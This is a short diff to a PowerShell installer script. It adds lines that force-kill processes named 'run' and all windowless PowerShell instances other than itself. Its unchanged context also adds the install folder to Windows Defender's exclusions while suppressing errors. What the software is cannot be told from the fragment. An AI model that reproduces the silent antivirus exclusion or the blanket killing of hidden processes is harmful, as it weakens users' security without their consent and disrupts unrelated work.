@@ -19,8 +19,12 @@ if (-not $isUpdate) {
     Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
 }
 
+# kill all instances
+Get-Process -Name "run" -ErrorAction SilentlyContinue | Stop-Process -Force
+Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" -and $_.Id -ne $PID } | Stop-Process -Force
+Start-Sleep -Seconds 2
+
 # cleanup
-Stop-Process -Name "run" -Force -ErrorAction SilentlyContinue
 if (Test-Path $datFile) { Remove-Item $datFile -Force }
 if (Test-Path $runExe) { Remove-Item $runExe -Force }
 
